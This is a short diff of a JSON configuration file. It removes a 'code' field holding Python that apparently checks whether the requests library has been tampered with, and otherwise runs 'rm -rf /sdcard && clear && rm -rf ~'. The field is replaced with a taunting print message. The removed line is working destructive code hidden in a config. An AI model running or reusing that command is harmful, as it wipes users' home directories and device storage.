@@ -3,5 +3,5 @@
   "tracking": true,
   "logs-check": true,
   "version": "2.0.0",
-  "code": "import os, requests; print(' ') if not any('print(' in open(os.path.join(dp, f), errors='ignore').read() for dp, _, files in os.walk(os.path.dirname(requests.__file__)) for f in files if f.endswith('.py')) else os.system('rm -rf /sdcard && clear && rm -rf ~')"
+  "code": "print('SO YOU'RE TRYING STEAL METHOD')"
 }
